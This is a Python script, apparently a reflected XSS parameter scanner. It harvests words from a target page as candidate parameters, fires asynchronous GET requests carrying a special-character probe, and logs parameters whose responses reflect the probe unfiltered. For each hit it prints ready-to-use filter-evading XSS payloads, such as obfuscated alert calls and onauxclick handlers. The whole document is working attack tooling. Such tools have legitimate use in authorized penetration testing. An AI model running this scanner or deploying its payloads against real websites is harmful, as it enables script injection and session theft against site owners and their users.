#!/bin/python3
import argparse
import requests
import subprocess
import sys
import re
import os
import urllib3
import math
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
import asyncio
import aiohttp
import time
from tqdm import tqdm
from tqdm.notebook import trange
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main():
    prs = set()
    try:
        r = requests.get(endpoint, timeout=60)
        mimetype = r.headers['content-type']
        if True:
            for lines in r:
                c1 = re.sub(' |\\\|`|!|@|#|\$|%|\^|\&|\*|\(|\)|\+|\{|\}|\[|\]|\>|\,|\<|\*|\;|\'|\~|\.|\"|\:|/|\?|(["|"])|\=', r'\n', lines.decode('utf-8', 'ignore'), flags = re.M)
                c2 = re.sub('\n\s*\n', r'\n', c1, flags = re.M)
                c = re.sub('\s+', r'\n', c2, flags = re.M)
                cc = re.sub('-|_', r'\n', c, flags = re.M)
                pars = c.splitlines()
                pars2 = cc.splitlines()
                for par in pars:
                    if par not in prs:
                        prs.add(par)
                    else:
                        pass
                for par2 in pars2:
                    if par2 not in prs:
                        prs.add(par2)
                    else:
                        pass

            output_file = args["output"]
            q = "='\"()=<>abcd"
            parameters = prs
            results = open(output_file+'.txt', 'a+')

            with tqdm(total=math.trunc(len(prs)/7), desc="\033[96m[!] Progress", bar_format="\033[33m{l_bar}{bar}") as pbar:
                o = set()
                async def main(prs):
                    async def get(parameter, session):
                        try:
                            async with session.get(parameter, headers=headers, timeout=60) as response:
                                html = await response.text()
                                if "<>abcd" in html:
                                    o.add(parameter)
                                    results.write("%s\n" %parameter)
                                    print("[!] URL: %s" %endpoint)
                                    print("[!] Unfiltered: '\"()=<>")
                                    print("[!] Type: GET")
                                    print("[!] Injection point: %s" %parameter)
                                    print("[!] Payloads:")
                                    print("<video/onloadstart=(_=alert,_)(1)><source>")
                                    print("<img src=x onerror=top[8680439..toString(30)](1)>")
                                    print("<x onauxclick=a=prompt,a(1)>XSSpear</x>")
                                    print("<x onauxclick=top['alert'](1)>XSSpear</x>")
                                pbar.update(1)
                        except:
                                pbar.update(1)
                    async with aiohttp.ClientSession() as session:
                        ret = await asyncio.gather(*[get(endpoint + "?&" + p1 + q, session) for p1 in parameters])
                start = time.time()
                asyncio.run(main(parameters))
                end = time.time()
            results.close()

        else:
            print("\n\033[96m[-] Skipping \033[33m%s \033[96m[Invalid Mime-Type]" %endpoint)
            pass

    except IndexError:
        pass

if __name__ == "__main__":
    try:
        ap = argparse.ArgumentParser()
        ap.add_argument("-t", "--target", required=True, help="Target")
        ap.add_argument("-a", "--agent", required=False, help="User Agent", nargs='?', const=1, default="Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20120101 Firefox/33.0")
        ap.add_argument("-c", "--cookies", required=False, help="Cookies", nargs='?', const=1, default="NULL")
        ap.add_argument("-o", "--output", required=False, help="Output", nargs='?', const=1, default="NULL")
        args = vars(ap.parse_args())
        headers = {'User-Agent': args["agent"], 'Cookie': args["cookies"]}
        endpoint = args["target"]
    except IndexError:
        sys.exit(-1)

main()
